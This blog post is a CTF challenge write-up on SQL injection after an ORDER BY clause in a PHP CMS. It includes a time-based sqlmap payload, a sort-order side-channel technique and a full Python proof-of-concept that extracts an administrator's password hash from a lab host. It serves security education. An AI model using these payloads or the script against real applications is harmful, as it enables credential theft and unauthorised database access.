---
title: SQLi after order by in less than 22 chars
date: 2017-07-11
layout: post
slug: sql-injection-after-order-by
published: true
---
I like a good challenge.

During some reconnaissance, i found the career challenges of [contextis](https://www.contextis.com/careers/challenges) and was kind of drawn into the web application ones.

# The challenge
The challenge itself is a basic PHP Code Review with the following task:
```
You have downloaded a fancy CMS. Can you identify a way to extract the administrator hash? The accepted solution is the payload used to receive the hash.
```

**IF YOU READ ON, SPOILER AWAITS**
# Looking around
Looking around the code, there is one SQLi which jumps into your eye in `action/list.php`:
```php
<?php
//[...]
if(isset($_GET['order']) && strlen($_GET['order']) <= 11) {
        $order= $_GET['order'];
} else {
       $order = "id";
}

if(isset($_GET['sort']) && strlen($_GET['sort']) <= 11) {
        $sort= $_GET['sort'];
} else {
       $sort = "ASC";
}

$query = mysql_query("SELECT * FROM user order by $order $sort");
```

There it is. The beauty of an SQLi after order by.

# The basic SQLi
## Union Select
Forget the union select in this case. We are injecting after an order by and union is not allowed in SQL statements after this point. Therefore we have to find a different method.

## Join
ARE YOU MAD? We have the same problem of "Not allowed after an order by".

## Blind SQli
Okokok....let's just use a blind SQLi. For sure, the easiest solution would be using a subselect with a normal time delay. And sqlmap proofs me right here.
```
---
Parameter: order (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: action=list&order=2 AND SLEEP(5)&sort=ASC
---
```
This works to proof the SQLi. But: If you want to extract serious data you can't do it below 22 chars.

# Crazy Solution
Let's step up the game and recap.

We control the order of the user list output. What can we do here. We could reorder stuff, du'h.

Consider the following SQL statement:
```
mysql> select id,username,pwd from user order by pwd;
+----+--------------+----------------------------------+
| id | username     | pwd                              |
+----+--------------+----------------------------------+
|  5 | nuit         | 098f6bcd4621d373cade4e832627b4f6 |
|  7 | test         | 098f6bcd4621d373cade4e832627b4f6 |
|  6 | tester01     | 6a36da6b6787c25eef0eed8025b3d3bc |
|  4 | evenmoreevil | ce9a6667cb746ec19d1714876f6ba38a |
|  2 | hacker       | d6a6bc0db10694a2d90e3a69648f3a03 |
|  3 | admin%       | e83f08e2f234e153c47ff99541e9a979 |
|  1 | admin        | e89f3f6c01d96f9c363e224a66b8db77 |
+----+--------------+----------------------------------+
```
It gets sorted by pwd and we know the first character of the admin password hash is after the first character of nuits hash.

Using substring we can sort by each character of the hash:
```
mysql> select id,username,substr(pwd,1,1),pwd from user order by substr(pwd,2,1);
+----+--------------+-----------------+----------------------------------+
| id | username     | substr(pwd,1,1) | pwd                              |
+----+--------------+-----------------+----------------------------------+
|  2 | hacker       | d               | d6a6bc0db10694a2d90e3a69648f3a03 |
|  1 | admin        | e               | e89f3f6c01d96f9c363e224a66b8db77 |
|  3 | admin%       | e               | e83f08e2f234e153c47ff99541e9a979 |
|  5 | nuit         | 0               | 098f6bcd4621d373cade4e832627b4f6 |
|  7 | test         | 0               | 098f6bcd4621d373cade4e832627b4f6 |
|  6 | tester01     | 6               | 6a36da6b6787c25eef0eed8025b3d3bc |
|  4 | evenmoreevil | c               | ce9a6667cb746ec19d1714876f6ba38a |
+----+--------------+-----------------+----------------------------------+
```

okokok....we know we can sort stuff...but how the heck should i control the password, if the password is a md5 hash.

## Control the things you can
I can choose my own username. Adding 16 users with a predefined username `adminaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa` and `adminbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb` we can control what we sort after by concatenating username and password field.

```
mysql> select concat(username,pwd) from user where username like "admin%";
+-----------------------------------------------------------------------+
| concat(username,pwd)                                                  |
+-----------------------------------------------------------------------+
| admine89f3f6c01d96f9c363e224a66b8db77                                 |
| admin%e83f08e2f234e153c47ff99541e9a979                                |
| adminaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa098f6bcd4621d373cade4e832627b4f6 |
| adminbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb098f6bcd4621d373cade4e832627b4f6 |
+-----------------------------------------------------------------------+
```
Sorting, based on each character of the hash, we can determine which character it has to be, depending on the output position.

Using synonym functions and shortening the query a bit by using the `hp` field instead of `username`, we arrive at a pretty short injection:
```sql
select * from user order by mid(concat(hp,pwd),<n>);
```

Preeeeetty good, considering it has 23 characters. But remember, we are still a character over our challenge. The concat has to go!

## Using MD5 hashed passwords
What if we can only sort by password and use a password set by us to determine the character.

We know our password, therefore we know the hash, which is in the database. Sorting against a single character of the password and checking if admin is before or after our user, we can determine if the character of the admin password hash is before or after our hash.

Doing that for a lot of different passwords we probably will get every single one of the 16 characters in all of the 32 places.
For Example, if we look at character 32 of the admin hash, we can see the order changed at "7", therefore it has to be 7.
```
31:0:0
31:1:0
31:2:0
31:3:0
31:4:0
31:5:0
31:6:0
31:7:1
31:8:1
31:9:1
31:a:1
31:b:1
31:c:1
31:d:1
31:e:1
31:f:1
```

Doing this for every character will extract the password hash from the database.

# Exploit
Running the exploit, it will try to register an user "nuit" with initial password "test". After this, it checks the sorting of each character in `md5("test")` with the payload `order=mid(pwd,&sort=<n>,1),id`.
After it has all informations it can extract from the single md5 hash, it uses the hash as new password and uses `md5(md5("test"))` as new hash. That's an easy way for an endless supply of hashes.
(See code at the end of the article)

![Exploit in GIF](/img/ezgif.com-gif-maker.gif)

Needless to say: even with the sorting by id (which makes it more reliable and faster) we crush the below 22 characters challenge with 17 chars.
Without it would be 12 :)

# Conclusion
I have never ever extracted data by sorting the output. But it is a pretty good and fast method with short injections.

If there is a better method extracting the hash, let me know on twitter.

so long

# PoC Code
*Shame on me...the code is pretty ugly*
```python
import sys
import requests
import hashlib
from bs4 import BeautifulSoup

start='test'
t = {}
md5=hashlib.md5(start.encode('utf-8')).hexdigest()

s = requests.Session()
print("[+] Registering user 'nuit' with password '%s'" % (start))
r = s.post('http://33.33.33.10/index.php?action=register',data={
    'username':'nuit',
    'password':start,
    'email': 'blubb@blaa.com',
    'hp': 'http://1',
    'save':'Create'
})

print("[+] Querying user 'nuit' to get ID for later sorting")
r = requests.get('http://33.33.33.10/index.php?action=list')
soup = BeautifulSoup(r.text, 'html.parser')
table = soup.find('div',attrs={'id':'inhalt'})
for tr in table.find_all('tr'):
    names = tr.find_all('th')
    if(names[1].text == 'nuit'):
        id = names[0].text
        break

print("[+] Received ID: '%s'" % (id))
print("[+] Login to obtain session")
r = s.post('http://33.33.33.10/index.php?action=login',data={
    'username':'nuit',
    'password':start,
    'login':'Login'
})

def check():
    for i in range(32):
        r = requests.get('http://33.33.33.10/index.php?action=list&order=mid(pwd,&sort='+str(i+1)+',1),id')

        soup = BeautifulSoup(r.text, 'html.parser')
        table = soup.find('div',attrs={'id':'inhalt'})
        for tr in table.find_all('tr'):
            if tr.find_all('th')[0].text == id:
                t[str(i)+':'+md5[i]] = 0
                break
            if tr.find_all('th')[0].text == '1':
                t[str(i)+':'+md5[i]] = 1
                break

def reset():
    print("[+] Resetting User 'nuit' to password 'test'")
    r = s.post('http://33.33.33.10/index.php?action=edit', data={
        'username': 'nuit',
        'password': 'test',
        'email': 'blubb@blaa.com',
        'hp': 'http://localhost/blog/',
        'edit': 'Update'
    })

def print_not_finished(e):
    tmp = ''
    for i in range(32):
        def inner():
            for c in range(16):
                try:
                    pos = str(i)+':'+hex(c)[2:]
                    if(t[pos] == 1):
                        return hex(c)[2:]
                except:
                    pass
            else:
                return '0'
        tmp += inner()
    print(tmp,end=e)

print("[+] Exploiting....")
while 1:
    check()
    print_not_finished("\r")
    if(len(t) == 512):
        print("[+] MD5 Hash of Admin: ",end="")
        print_not_finished("")
        print("")
        reset()
        sys.exit()

    r = s.post('http://33.33.33.10/index.php?action=edit', data={
        'username': 'nuit',
        'password': md5,
        'email': 'blubb@blaa.com',
        'hp': 'http://localhost/blog/',
        'edit': 'Update'
    })
    md5=hashlib.md5(md5.encode('utf-8')).hexdigest()
```
